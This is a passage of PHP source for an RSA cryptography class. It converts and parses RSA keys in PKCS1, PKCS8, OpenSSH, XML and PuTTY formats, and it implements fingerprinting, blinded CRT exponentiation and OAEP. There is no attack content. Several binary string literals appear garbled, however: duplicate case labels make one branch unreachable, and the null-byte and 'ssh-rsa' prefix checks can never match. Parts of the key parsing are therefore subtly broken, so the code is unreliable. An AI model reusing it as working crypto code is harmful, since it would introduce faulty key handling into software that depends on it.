                        $RSAPrivateKey = pack('Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($RSAPrivateKey)), $RSAPrivateKey);
                        $RSAPrivateKey = "-----BEGIN ENCRYPTED PRIVATE KEY-----
" . chunk_split(base64_encode($RSAPrivateKey), 64) . '-----END ENCRYPTED PRIVATE KEY-----';
                    } else {
                        $RSAPrivateKey = "-----BEGIN PRIVATE KEY-----
" . chunk_split(base64_encode($RSAPrivateKey), 64) . '-----END PRIVATE KEY-----';
                    }
                    return $RSAPrivateKey;
                }
                if (!empty($this->password) || is_string($this->password)) {
                    $iv = crypt_random_string(8);
                    $symkey = pack('H*', md5($this->password . $iv));
                    $symkey.= substr(pack('H*', md5($symkey . $this->password . $iv)), 0, 8);
                    if (!class_exists('Crypt_TripleDES')) {
                        include_once 'Crypt/TripleDES.php';
                    }
                    $des = new Crypt_TripleDES();
                    $des->setKey($symkey);
                    $des->setIV($iv);
                    $iv = strtoupper(bin2hex($iv));
                    $RSAPrivateKey = "-----BEGIN RSA PRIVATE KEY-----
" . "Proc-Type: 4,ENCRYPTED
" . "DEK-Info: DES-EDE3-CBC,$iv
" . "
" . chunk_split(base64_encode($des->encrypt($RSAPrivateKey)), 64) . '-----END RSA PRIVATE KEY-----';
                } else {
                    $RSAPrivateKey = "-----BEGIN RSA PRIVATE KEY-----
" . chunk_split(base64_encode($RSAPrivateKey), 64) . '-----END RSA PRIVATE KEY-----';
                }
                return $RSAPrivateKey;
        }
    }
    function _convertPublicKey($n, $e) {
        $signed = $this->publicKeyFormat != CRYPT_RSA_PUBLIC_FORMAT_XML;
        $modulus = $n->toBytes($signed);
        $publicExponent = $e->toBytes($signed);
        switch ($this->publicKeyFormat) {
            case CRYPT_RSA_PUBLIC_FORMAT_RAW:
                return array('e' => $e->copy(), 'n' => $n->copy());
            case CRYPT_RSA_PUBLIC_FORMAT_XML:
                return "<RSAKeyValue>
" . ' <Modulus>' . base64_encode($modulus) . "</Modulus>
" . ' <Exponent>' . base64_encode($publicExponent) . "</Exponent>
" . '</RSAKeyValue>';
            break;
            case CRYPT_RSA_PUBLIC_FORMAT_OPENSSH:
                $RSAPublicKey = pack('Na*Na*Na*', strlen('ssh-rsa'), 'ssh-rsa', strlen($publicExponent), $publicExponent, strlen($modulus), $modulus);
                $RSAPublicKey = 'ssh-rsa ' . base64_encode($RSAPublicKey) . ' ' . $this->comment;
                return $RSAPublicKey;
            default:
                $components = array('modulus' => pack('Ca*a*', CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(strlen($modulus)), $modulus), 'publicExponent' => pack('Ca*a*', CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(strlen($publicExponent)), $publicExponent));
                $RSAPublicKey = pack('Ca*a*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($components['modulus']) + strlen($components['publicExponent'])), $components['modulus'], $components['publicExponent']);
                if ($this->publicKeyFormat == CRYPT_RSA_PUBLIC_FORMAT_PKCS1_RAW) {
                    $RSAPublicKey = "-----BEGIN RSA PUBLIC KEY-----
" . chunk_split(base64_encode($RSAPublicKey), 64) . '-----END RSA PUBLIC KEY-----';
                } else {
                    $rsaOID = pack('H*', '300d06092a864886f70d0101010500');
                    $RSAPublicKey = chr(0) . $RSAPublicKey;
                    $RSAPublicKey = chr(3) . $this->_encodeLength(strlen($RSAPublicKey)) . $RSAPublicKey;
                    $RSAPublicKey = pack('Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($rsaOID . $RSAPublicKey)), $rsaOID . $RSAPublicKey);
                    $RSAPublicKey = "-----BEGIN PUBLIC KEY-----
" . chunk_split(base64_encode($RSAPublicKey), 64) . '-----END PUBLIC KEY-----';
                }
                return $RSAPublicKey;
        }
    }
    function _parseKey($key, $type) {
        if ($type != CRYPT_RSA_PUBLIC_FORMAT_RAW && !is_string($key)) {
            return false;
        }
        switch ($type) {
            case CRYPT_RSA_PUBLIC_FORMAT_RAW:
                if (!is_array($key)) {
                    return false;
                }
                $components = array();
                switch (true) {
                    case isset($key['e']):
                        $components['publicExponent'] = $key['e']->copy();
                    break;
                    case isset($key['exponent']):
                        $components['publicExponent'] = $key['exponent']->copy();
                    break;
                    case isset($key['publicExponent']):
                        $components['publicExponent'] = $key['publicExponent']->copy();
                    break;
                    case isset($key[0]):
                        $components['publicExponent'] = $key[0]->copy();
                }
                switch (true) {
                    case isset($key['n']):
                        $components['modulus'] = $key['n']->copy();
                    break;
                    case isset($key['modulo']):
                        $components['modulus'] = $key['modulo']->copy();
                    break;
                    case isset($key['modulus']):
                        $components['modulus'] = $key['modulus']->copy();
                    break;
                    case isset($key[1]):
                        $components['modulus'] = $key[1]->copy();
                }
                return isset($components['modulus']) && isset($components['publicExponent']) ? $components : false;
            case CRYPT_RSA_PRIVATE_FORMAT_PKCS1:
            case CRYPT_RSA_PRIVATE_FORMAT_PKCS8:
            case CRYPT_RSA_PUBLIC_FORMAT_PKCS1:
                if (preg_match('#DEK-Info: (.+),(.+)#', $key, $matches)) {
                    $iv = pack('H*', trim($matches[2]));
                    $symkey = pack('H*', md5($this->password . substr($iv, 0, 8)));
                    $symkey.= pack('H*', md5($symkey . $this->password . substr($iv, 0, 8)));
                    $key = preg_replace('#^(?:Proc-Type|DEK-Info): .*#m', '', $key);
                    $ciphertext = $this->_extractBER($key);
                    if ($ciphertext === false) {
                        $ciphertext = $key;
                    }
                    switch ($matches[1]) {
                        case 'AES-256-CBC':
                            if (!class_exists('Crypt_AES')) {
                                include_once 'Crypt/AES.php';
                            }
                            $crypto = new Crypt_AES();
                        break;
                        case 'AES-128-CBC':
                            if (!class_exists('Crypt_AES')) {
                                include_once 'Crypt/AES.php';
                            }
                            $symkey = substr($symkey, 0, 16);
                            $crypto = new Crypt_AES();
                        break;
                        case 'DES-EDE3-CFB':
                            if (!class_exists('Crypt_TripleDES')) {
                                include_once 'Crypt/TripleDES.php';
                            }
                            $crypto = new Crypt_TripleDES(CRYPT_DES_MODE_CFB);
                        break;
                        case 'DES-EDE3-CBC':
                            if (!class_exists('Crypt_TripleDES')) {
                                include_once 'Crypt/TripleDES.php';
                            }
                            $symkey = substr($symkey, 0, 24);
                            $crypto = new Crypt_TripleDES();
                        break;
                        case 'DES-CBC':
                            if (!class_exists('Crypt_DES')) {
                                include_once 'Crypt/DES.php';
                            }
                            $crypto = new Crypt_DES();
                        break;
                        default:
                            return false;
                    }
                    $crypto->setKey($symkey);
                    $crypto->setIV($iv);
                    $decoded = $crypto->decrypt($ciphertext);
                } else {
                    $decoded = $this->_extractBER($key);
                }
                if ($decoded !== false) {
                    $key = $decoded;
                }
                $components = array();
                if (ord($this->_string_shift($key)) != CRYPT_RSA_ASN1_SEQUENCE) {
                    return false;
                }
                if ($this->_decodeLength($key) != strlen($key)) {
                    return false;
                }
                $tag = ord($this->_string_shift($key));
                if ($tag == CRYPT_RSA_ASN1_INTEGER && substr($key, 0, 3) == "0") {
                    $this->_string_shift($key, 3);
                    $tag = CRYPT_RSA_ASN1_SEQUENCE;
                }
                if ($tag == CRYPT_RSA_ASN1_SEQUENCE) {
                    $temp = $this->_string_shift($key, $this->_decodeLength($key));
                    if (ord($this->_string_shift($temp)) != CRYPT_RSA_ASN1_OBJECT) {
                        return false;
                    }
                    $length = $this->_decodeLength($temp);
                    switch ($this->_string_shift($temp, $length)) {
                        case "*H
":
                        break;
                        case "*H
":
                            if (ord($this->_string_shift($temp)) != CRYPT_RSA_ASN1_SEQUENCE) {
                                return false;
                            }
                            if ($this->_decodeLength($temp) != strlen($temp)) {
                                return false;
                            }
                            $this->_string_shift($temp);
                            $salt = $this->_string_shift($temp, $this->_decodeLength($temp));
                            if (ord($this->_string_shift($temp)) != CRYPT_RSA_ASN1_INTEGER) {
                                return false;
                            }
                            $this->_decodeLength($temp);
                            list(, $iterationCount) = unpack('N', str_pad($temp, 4, chr(0), STR_PAD_LEFT));
                            $this->_string_shift($key);
                            $length = $this->_decodeLength($key);
                            if (strlen($key) != $length) {
                                return false;
                            }
                            if (!class_exists('Crypt_DES')) {
                                include_once 'Crypt/DES.php';
                            }
                            $crypto = new Crypt_DES();
                            $crypto->setPassword($this->password, 'pbkdf1', 'md5', $salt, $iterationCount);
                            $key = $crypto->decrypt($key);
                            if ($key === false) {
                                return false;
                            }
                            return $this->_parseKey($key, CRYPT_RSA_PRIVATE_FORMAT_PKCS1);
                        default:
                            return false;
                    }
                    $tag = ord($this->_string_shift($key));
                    $this->_decodeLength($key);
                    if ($tag == CRYPT_RSA_ASN1_BITSTRING) {
                        $this->_string_shift($key);
                    }
                    if (ord($this->_string_shift($key)) != CRYPT_RSA_ASN1_SEQUENCE) {
                        return false;
                    }
                    if ($this->_decodeLength($key) != strlen($key)) {
                        return false;
                    }
                    $tag = ord($this->_string_shift($key));
                }
                if ($tag != CRYPT_RSA_ASN1_INTEGER) {
                    return false;
                }
                $length = $this->_decodeLength($key);
                $temp = $this->_string_shift($key, $length);
                if (strlen($temp) != 1 || ord($temp) > 2) {
                    $components['modulus'] = new Math_BigInteger($temp, 256);
                    $this->_string_shift($key);
                    $length = $this->_decodeLength($key);
                    $components[$type == CRYPT_RSA_PUBLIC_FORMAT_PKCS1 ? 'publicExponent' : 'privateExponent'] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                    return $components;
                }
                if (ord($this->_string_shift($key)) != CRYPT_RSA_ASN1_INTEGER) {
                    return false;
                }
                $length = $this->_decodeLength($key);
                $components['modulus'] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['publicExponent'] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['privateExponent'] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['primes'] = array(1 => new Math_BigInteger($this->_string_shift($key, $length), 256));
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['primes'][] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['exponents'] = array(1 => new Math_BigInteger($this->_string_shift($key, $length), 256));
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['exponents'][] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                $this->_string_shift($key);
                $length = $this->_decodeLength($key);
                $components['coefficients'] = array(2 => new Math_BigInteger($this->_string_shift($key, $length), 256));
                if (!empty($key)) {
                    if (ord($this->_string_shift($key)) != CRYPT_RSA_ASN1_SEQUENCE) {
                        return false;
                    }
                    $this->_decodeLength($key);
                    while (!empty($key)) {
                        if (ord($this->_string_shift($key)) != CRYPT_RSA_ASN1_SEQUENCE) {
                            return false;
                        }
                        $this->_decodeLength($key);
                        $key = substr($key, 1);
                        $length = $this->_decodeLength($key);
                        $components['primes'][] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                        $this->_string_shift($key);
                        $length = $this->_decodeLength($key);
                        $components['exponents'][] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                        $this->_string_shift($key);
                        $length = $this->_decodeLength($key);
                        $components['coefficients'][] = new Math_BigInteger($this->_string_shift($key, $length), 256);
                    }
                }
                return $components;
            case CRYPT_RSA_PUBLIC_FORMAT_OPENSSH:
                $parts = explode(' ', $key, 3);
                $key = isset($parts[1]) ? base64_decode($parts[1]) : false;
                if ($key === false) {
                    return false;
                }
                $comment = isset($parts[2]) ? $parts[2] : false;
                $cleanup = substr($key, 0, 11) == "ssh-rsa";
                if (strlen($key) <= 4) {
                    return false;
                }
                extract(unpack('Nlength', $this->_string_shift($key, 4)));
                $publicExponent = new Math_BigInteger($this->_string_shift($key, $length), -256);
                if (strlen($key) <= 4) {
                    return false;
                }
                extract(unpack('Nlength', $this->_string_shift($key, 4)));
                $modulus = new Math_BigInteger($this->_string_shift($key, $length), -256);
                if ($cleanup && strlen($key)) {
                    if (strlen($key) <= 4) {
                        return false;
                    }
                    extract(unpack('Nlength', $this->_string_shift($key, 4)));
                    $realModulus = new Math_BigInteger($this->_string_shift($key, $length), -256);
                    return strlen($key) ? false : array('modulus' => $realModulus, 'publicExponent' => $modulus, 'comment' => $comment);
                } else {
                    return strlen($key) ? false : array('modulus' => $modulus, 'publicExponent' => $publicExponent, 'comment' => $comment);
                }
            case CRYPT_RSA_PRIVATE_FORMAT_XML:
            case CRYPT_RSA_PUBLIC_FORMAT_XML:
                $this->components = array();
                $xml = xml_parser_create('UTF-8');
                xml_set_object($xml, $this);
                xml_set_element_handler($xml, '_start_element_handler', '_stop_element_handler');
                xml_set_character_data_handler($xml, '_data_handler');
                if (!xml_parse($xml, '<xml>' . $key . '</xml>')) {
                    return false;
                }
                return isset($this->components['modulus']) && isset($this->components['publicExponent']) ? $this->components : false;
            case CRYPT_RSA_PRIVATE_FORMAT_PUTTY:
                $components = array();
                $key = preg_split('#
|
|
#', $key);
                $type = trim(preg_replace('#PuTTY-User-Key-File-2: (.+)#', '$1', $key[0]));
                if ($type != 'ssh-rsa') {
                    return false;
                }
                $encryption = trim(preg_replace('#Encryption: (.+)#', '$1', $key[1]));
                $comment = trim(preg_replace('#Comment: (.+)#', '$1', $key[2]));
                $publicLength = trim(preg_replace('#Public-Lines: (\d+)#', '$1', $key[3]));
                $public = base64_decode(implode('', array_map('trim', array_slice($key, 4, $publicLength))));
                $public = substr($public, 11);
                extract(unpack('Nlength', $this->_string_shift($public, 4)));
                $components['publicExponent'] = new Math_BigInteger($this->_string_shift($public, $length), -256);
                extract(unpack('Nlength', $this->_string_shift($public, 4)));
                $components['modulus'] = new Math_BigInteger($this->_string_shift($public, $length), -256);
                $privateLength = trim(preg_replace('#Private-Lines: (\d+)#', '$1', $key[$publicLength + 4]));
                $private = base64_decode(implode('', array_map('trim', array_slice($key, $publicLength + 5, $privateLength))));
                switch ($encryption) {
                    case 'aes256-cbc':
                        if (!class_exists('Crypt_AES')) {
                            include_once 'Crypt/AES.php';
                        }
                        $symkey = '';
                        $sequence = 0;
                        while (strlen($symkey) < 32) {
                            $temp = pack('Na*', $sequence++, $this->password);
                            $symkey.= pack('H*', sha1($temp));
                        }
                        $symkey = substr($symkey, 0, 32);
                        $crypto = new Crypt_AES();
                }
                if ($encryption != 'none') {
                    $crypto->setKey($symkey);
                    $crypto->disablePadding();
                    $private = $crypto->decrypt($private);
                    if ($private === false) {
                        return false;
                    }
                }
                extract(unpack('Nlength', $this->_string_shift($private, 4)));
                if (strlen($private) < $length) {
                    return false;
                }
                $components['privateExponent'] = new Math_BigInteger($this->_string_shift($private, $length), -256);
                extract(unpack('Nlength', $this->_string_shift($private, 4)));
                if (strlen($private) < $length) {
                    return false;
                }
                $components['primes'] = array(1 => new Math_BigInteger($this->_string_shift($private, $length), -256));
                extract(unpack('Nlength', $this->_string_shift($private, 4)));
                if (strlen($private) < $length) {
                    return false;
                }
                $components['primes'][] = new Math_BigInteger($this->_string_shift($private, $length), -256);
                $temp = $components['primes'][1]->subtract($this->one);
                $components['exponents'] = array(1 => $components['publicExponent']->modInverse($temp));
                $temp = $components['primes'][2]->subtract($this->one);
                $components['exponents'][] = $components['publicExponent']->modInverse($temp);
                extract(unpack('Nlength', $this->_string_shift($private, 4)));
                if (strlen($private) < $length) {
                    return false;
                }
                $components['coefficients'] = array(2 => new Math_BigInteger($this->_string_shift($private, $length), -256));
                return $components;
        }
    }
    function getSize() {
        return !isset($this->modulus) ? 0 : strlen($this->modulus->toBits());
    }
    function _start_element_handler($parser, $name, $attribs) {
        switch ($name) {
            case 'MODULUS':
                $this->current = & $this->components['modulus'];
            break;
            case 'EXPONENT':
                $this->current = & $this->components['publicExponent'];
            break;
            case 'P':
                $this->current = & $this->components['primes'][1];
            break;
            case 'Q':
                $this->current = & $this->components['primes'][2];
            break;
            case 'DP':
                $this->current = & $this->components['exponents'][1];
            break;
            case 'DQ':
                $this->current = & $this->components['exponents'][2];
            break;
            case 'INVERSEQ':
                $this->current = & $this->components['coefficients'][2];
            break;
            case 'D':
                $this->current = & $this->components['privateExponent'];
        }
        $this->current = '';
    }
    function _stop_element_handler($parser, $name) {
        if (isset($this->current)) {
            $this->current = new Math_BigInteger(base64_decode($this->current), 256);
            unset($this->current);
        }
    }
    function _data_handler($parser, $data) {
        if (!isset($this->current) || is_object($this->current)) {
            return;
        }
        $this->current.= trim($data);
    }
    function loadKey($key, $type = false) {
        if (is_object($key) && strtolower(get_class($key)) == 'crypt_rsa') {
            $this->privateKeyFormat = $key->privateKeyFormat;
            $this->publicKeyFormat = $key->publicKeyFormat;
            $this->k = $key->k;
            $this->hLen = $key->hLen;
            $this->sLen = $key->sLen;
            $this->mgfHLen = $key->mgfHLen;
            $this->encryptionMode = $key->encryptionMode;
            $this->signatureMode = $key->signatureMode;
            $this->password = $key->password;
            $this->configFile = $key->configFile;
            $this->comment = $key->comment;
            if (is_object($key->hash)) {
                $this->hash = new Crypt_Hash($key->hash->getHash());
            }
            if (is_object($key->mgfHash)) {
                $this->mgfHash = new Crypt_Hash($key->mgfHash->getHash());
            }
            if (is_object($key->modulus)) {
                $this->modulus = $key->modulus->copy();
            }
            if (is_object($key->exponent)) {
                $this->exponent = $key->exponent->copy();
            }
            if (is_object($key->publicExponent)) {
                $this->publicExponent = $key->publicExponent->copy();
            }
            $this->primes = array();
            $this->exponents = array();
            $this->coefficients = array();
            foreach ($this->primes as $prime) {
                $this->primes[] = $prime->copy();
            }
            foreach ($this->exponents as $exponent) {
                $this->exponents[] = $exponent->copy();
            }
            foreach ($this->coefficients as $coefficient) {
                $this->coefficients[] = $coefficient->copy();
            }
            return true;
        }
        if ($type === false) {
            $types = array(CRYPT_RSA_PUBLIC_FORMAT_RAW, CRYPT_RSA_PRIVATE_FORMAT_PKCS1, CRYPT_RSA_PRIVATE_FORMAT_XML, CRYPT_RSA_PRIVATE_FORMAT_PUTTY, CRYPT_RSA_PUBLIC_FORMAT_OPENSSH);
            foreach ($types as $type) {
                $components = $this->_parseKey($key, $type);
                if ($components !== false) {
                    break;
                }
            }
        } else {
            $components = $this->_parseKey($key, $type);
        }
        if ($components === false) {
            return false;
        }
        if (isset($components['comment']) && $components['comment'] !== false) {
            $this->comment = $components['comment'];
        }
        $this->modulus = $components['modulus'];
        $this->k = strlen($this->modulus->toBytes());
        $this->exponent = isset($components['privateExponent']) ? $components['privateExponent'] : $components['publicExponent'];
        if (isset($components['primes'])) {
            $this->primes = $components['primes'];
            $this->exponents = $components['exponents'];
            $this->coefficients = $components['coefficients'];
            $this->publicExponent = $components['publicExponent'];
        } else {
            $this->primes = array();
            $this->exponents = array();
            $this->coefficients = array();
            $this->publicExponent = false;
        }
        switch ($type) {
            case CRYPT_RSA_PUBLIC_FORMAT_OPENSSH:
            case CRYPT_RSA_PUBLIC_FORMAT_RAW:
                $this->setPublicKey();
            break;
            case CRYPT_RSA_PRIVATE_FORMAT_PKCS1:
                switch (true) {
                    case strpos($key, '-BEGIN PUBLIC KEY-') !== false:
                    case strpos($key, '-BEGIN RSA PUBLIC KEY-') !== false:
                        $this->setPublicKey();
                }
        }
        return true;
    }
    function setPassword($password = false) {
        $this->password = $password;
    }
    function setPublicKey($key = false, $type = false) {
        if (!empty($this->publicExponent)) {
            return false;
        }
        if ($key === false && !empty($this->modulus)) {
            $this->publicExponent = $this->exponent;
            return true;
        }
        if ($type === false) {
            $types = array(CRYPT_RSA_PUBLIC_FORMAT_RAW, CRYPT_RSA_PUBLIC_FORMAT_PKCS1, CRYPT_RSA_PUBLIC_FORMAT_XML, CRYPT_RSA_PUBLIC_FORMAT_OPENSSH);
            foreach ($types as $type) {
                $components = $this->_parseKey($key, $type);
                if ($components !== false) {
                    break;
                }
            }
        } else {
            $components = $this->_parseKey($key, $type);
        }
        if ($components === false) {
            return false;
        }
        if (empty($this->modulus) || !$this->modulus->equals($components['modulus'])) {
            $this->modulus = $components['modulus'];
            $this->exponent = $this->publicExponent = $components['publicExponent'];
            return true;
        }
        $this->publicExponent = $components['publicExponent'];
        return true;
    }
    function setPrivateKey($key = false, $type = false) {
        if ($key === false && !empty($this->publicExponent)) {
            $this->publicExponent = false;
            return true;
        }
        $rsa = new Crypt_RSA();
        if (!$rsa->loadKey($key, $type)) {
            return false;
        }
        $rsa->publicExponent = false;
        $this->loadKey($rsa);
        return true;
    }
    function getPublicKey($type = CRYPT_RSA_PUBLIC_FORMAT_PKCS8) {
        if (empty($this->modulus) || empty($this->publicExponent)) {
            return false;
        }
        $oldFormat = $this->publicKeyFormat;
        $this->publicKeyFormat = $type;
        $temp = $this->_convertPublicKey($this->modulus, $this->publicExponent);
        $this->publicKeyFormat = $oldFormat;
        return $temp;
    }
    function getPublicKeyFingerprint($algorithm = 'md5') {
        if (empty($this->modulus) || empty($this->publicExponent)) {
            return false;
        }
        $modulus = $this->modulus->toBytes(true);
        $publicExponent = $this->publicExponent->toBytes(true);
        $RSAPublicKey = pack('Na*Na*Na*', strlen('ssh-rsa'), 'ssh-rsa', strlen($publicExponent), $publicExponent, strlen($modulus), $modulus);
        switch ($algorithm) {
            case 'sha256':
                $hash = new Crypt_Hash('sha256');
                $base = base64_encode($hash->hash($RSAPublicKey));
                return substr($base, 0, strlen($base) - 1);
            case 'md5':
                return substr(chunk_split(md5($RSAPublicKey), 2, ':'), 0, -1);
            default:
                return false;
        }
    }
    function getPrivateKey($type = CRYPT_RSA_PUBLIC_FORMAT_PKCS1) {
        if (empty($this->primes)) {
            return false;
        }
        $oldFormat = $this->privateKeyFormat;
        $this->privateKeyFormat = $type;
        $temp = $this->_convertPrivateKey($this->modulus, $this->publicExponent, $this->exponent, $this->primes, $this->exponents, $this->coefficients);
        $this->privateKeyFormat = $oldFormat;
        return $temp;
    }
    function _getPrivatePublicKey($mode = CRYPT_RSA_PUBLIC_FORMAT_PKCS8) {
        if (empty($this->modulus) || empty($this->exponent)) {
            return false;
        }
        $oldFormat = $this->publicKeyFormat;
        $this->publicKeyFormat = $mode;
        $temp = $this->_convertPublicKey($this->modulus, $this->exponent);
        $this->publicKeyFormat = $oldFormat;
        return $temp;
    }
    function __toString() {
        $key = $this->getPrivateKey($this->privateKeyFormat);
        if ($key !== false) {
            return $key;
        }
        $key = $this->_getPrivatePublicKey($this->publicKeyFormat);
        return $key !== false ? $key : '';
    }
    function __clone() {
        $key = new Crypt_RSA();
        $key->loadKey($this);
        return $key;
    }
    function _generateMinMax($bits) {
        $bytes = $bits >> 3;
        $min = str_repeat(chr(0), $bytes);
        $max = str_repeat(chr(0xFF), $bytes);
        $msb = $bits & 7;
        if ($msb) {
            $min = chr(1 << ($msb - 1)) . $min;
            $max = chr((1 << $msb) - 1) . $max;
        } else {
            $min[0] = chr(0x80);
        }
        return array('min' => new Math_BigInteger($min, 256), 'max' => new Math_BigInteger($max, 256));
    }
    function _decodeLength(&$string) {
        $length = ord($this->_string_shift($string));
        if ($length & 0x80) {
            $length&= 0x7F;
            $temp = $this->_string_shift($string, $length);
            list(, $length) = unpack('N', substr(str_pad($temp, 4, chr(0), STR_PAD_LEFT), -4));
        }
        return $length;
    }
    function _encodeLength($length) {
        if ($length <= 0x7F) {
            return chr($length);
        }
        $temp = ltrim(pack('N', $length), chr(0));
        return pack('Ca*', 0x80 | strlen($temp), $temp);
    }
    function _string_shift(&$string, $index = 1) {
        $substr = substr($string, 0, $index);
        $string = substr($string, $index);
        return $substr;
    }
    function setPrivateKeyFormat($format) {
        $this->privateKeyFormat = $format;
    }
    function setPublicKeyFormat($format) {
        $this->publicKeyFormat = $format;
    }
    function setHash($hash) {
        switch ($hash) {
            case 'md2':
            case 'md5':
            case 'sha1':
            case 'sha256':
            case 'sha384':
            case 'sha512':
                $this->hash = new Crypt_Hash($hash);
                $this->hashName = $hash;
            break;
            default:
                $this->hash = new Crypt_Hash('sha1');
                $this->hashName = 'sha1';
        }
        $this->hLen = $this->hash->getLength();
    }
    function setMGFHash($hash) {
        switch ($hash) {
            case 'md2':
            case 'md5':
            case 'sha1':
            case 'sha256':
            case 'sha384':
            case 'sha512':
                $this->mgfHash = new Crypt_Hash($hash);
            break;
            default:
                $this->mgfHash = new Crypt_Hash('sha1');
        }
        $this->mgfHLen = $this->mgfHash->getLength();
    }
    function setSaltLength($sLen) {
        $this->sLen = $sLen;
    }
    function _i2osp($x, $xLen) {
        $x = $x->toBytes();
        if (strlen($x) > $xLen) {
            user_error('Integer too large');
            return false;
        }
        return str_pad($x, $xLen, chr(0), STR_PAD_LEFT);
    }
    function _os2ip($x) {
        return new Math_BigInteger($x, 256);
    }
    function _exponentiate($x) {
        switch (true) {
            case empty($this->primes):
            case $this->primes[1]->equals($this->zero):
            case empty($this->coefficients):
            case $this->coefficients[2]->equals($this->zero):
            case empty($this->exponents):
            case $this->exponents[1]->equals($this->zero):
                return $x->modPow($this->exponent, $this->modulus);
        }
        $num_primes = count($this->primes);
        if (defined('CRYPT_RSA_DISABLE_BLINDING')) {
            $m_i = array(1 => $x->modPow($this->exponents[1], $this->primes[1]), 2 => $x->modPow($this->exponents[2], $this->primes[2]));
            $h = $m_i[1]->subtract($m_i[2]);
            $h = $h->multiply($this->coefficients[2]);
            list(, $h) = $h->divide($this->primes[1]);
            $m = $m_i[2]->add($h->multiply($this->primes[2]));
            $r = $this->primes[1];
            for ($i = 3;$i <= $num_primes;$i++) {
                $m_i = $x->modPow($this->exponents[$i], $this->primes[$i]);
                $r = $r->multiply($this->primes[$i - 1]);
                $h = $m_i->subtract($m);
                $h = $h->multiply($this->coefficients[$i]);
                list(, $h) = $h->divide($this->primes[$i]);
                $m = $m->add($r->multiply($h));
            }
        } else {
            $smallest = $this->primes[1];
            for ($i = 2;$i <= $num_primes;$i++) {
                if ($smallest->compare($this->primes[$i]) > 0) {
                    $smallest = $this->primes[$i];
                }
            }
            $one = new Math_BigInteger(1);
            $r = $one->random($one, $smallest->subtract($one));
            $m_i = array(1 => $this->_blind($x, $r, 1), 2 => $this->_blind($x, $r, 2));
            $h = $m_i[1]->subtract($m_i[2]);
            $h = $h->multiply($this->coefficients[2]);
            list(, $h) = $h->divide($this->primes[1]);
            $m = $m_i[2]->add($h->multiply($this->primes[2]));
            $r = $this->primes[1];
            for ($i = 3;$i <= $num_primes;$i++) {
                $m_i = $this->_blind($x, $r, $i);
                $r = $r->multiply($this->primes[$i - 1]);
                $h = $m_i->subtract($m);
                $h = $h->multiply($this->coefficients[$i]);
                list(, $h) = $h->divide($this->primes[$i]);
                $m = $m->add($r->multiply($h));
            }
        }
        return $m;
    }
    function _blind($x, $r, $i) {
        $x = $x->multiply($r->modPow($this->publicExponent, $this->primes[$i]));
        $x = $x->modPow($this->exponents[$i], $this->primes[$i]);
        $r = $r->modInverse($this->primes[$i]);
        $x = $x->multiply($r);
        list(, $x) = $x->divide($this->primes[$i]);
        return $x;
    }
    function _equals($x, $y) {
        if (strlen($x) != strlen($y)) {
            return false;
        }
        $result = 0;
        for ($i = 0;$i < strlen($x);$i++) {
            $result|= ord($x[$i]) ^ ord($y[$i]);
        }
        return $result == 0;
    }
    function _rsaep($m) {
        if ($m->compare($this->zero) < 0 || $m->compare($this->modulus) > 0) {
            user_error('Message representative out of range');
            return false;
        }
        return $this->_exponentiate($m);
    }
    function _rsadp($c) {
        if ($c->compare($this->zero) < 0 || $c->compare($this->modulus) > 0) {
            user_error('Ciphertext representative out of range');
            return false;
        }
        return $this->_exponentiate($c);
    }
    function _rsasp1($m) {
        if ($m->compare($this->zero) < 0 || $m->compare($this->modulus) > 0) {
            user_error('Message representative out of range');
            return false;
        }
        return $this->_exponentiate($m);
    }
    function _rsavp1($s) {
        if ($s->compare($this->zero) < 0 || $s->compare($this->modulus) > 0) {
            user_error('Signature representative out of range');
            return false;
        }
        return $this->_exponentiate($s);
    }
    function _mgf1($mgfSeed, $maskLen) {
        $t = '';
        $count = ceil($maskLen / $this->mgfHLen);
        for ($i = 0;$i < $count;$i++) {
            $c = pack('N', $i);
            $t.= $this->mgfHash->hash($mgfSeed . $c);
        }
        return substr($t, 0, $maskLen);
    }
    function _rsaes_oaep_encrypt($m, $l = '') {
        $mLen = strlen($m);
        if ($mLen > $this->k - 2 * $this->hLen - 2) {
            user_error('Message too long');
            return false;
        }
        $lHash = $this->hash->hash($l);
        $ps = str_repeat(chr(0), $this->k - $mLen - 2 * $this->hLen - 2);
        $db = $lHash . $ps . chr(1) . $m;
        $seed = crypt_random_string($this->hLen);
        $dbMask = $this->_mgf1($seed, $this->k - $this->hLen - 1);
        $maskedDB = $db ^ $dbMask;
        $seedMask = $this->_mgf1($maskedDB, $this->hLen);
        $maskedSeed = $seed ^ $seedMask;
        $em = chr(0) . $maskedSeed . $maskedDB;
        $m = $this->_os2ip($em);
        $c = $this->_rsaep($m);
        $c = $this->_i2osp($c, $this->k);
        return $c;
    }
    function _rsaes_oaep_decrypt($c, $l = '') {
        if (strlen($c) != $this->k || $this->k < 2 * $this->hLen + 2) {
            user_error('Decryption error');
            return false;
        }
        $c = $this->_os2ip($c);
        $m = $this->_rsadp($c);
        if ($m === false) {
            user_error('Decryption error');
            return false;
        }
        $em = $this->_i2osp($m, $this->k);
        $lHash = $this->hash->hash($l);
        $y = ord($em[0]);
        $maskedSeed = substr($em, 1, $this->hLen);
        $maskedDB = substr($em, $this->hLen + 1);
        $seedMask = $this->_mgf1($maskedDB, $this->hLen);
        $seed = $maskedSeed ^ $seedMask;
        $dbMask = $this->_mgf1($seed, $this->k - $this->hLen - 1);
        $db = $maskedDB ^ $dbMask;
        $lHash2 = substr($db, 0, $this->hLen);
        $m = substr($db, $this->hLen);
        if ($lHash != $lHash2) {
            user_error('Decryption error');
            return false;
        }
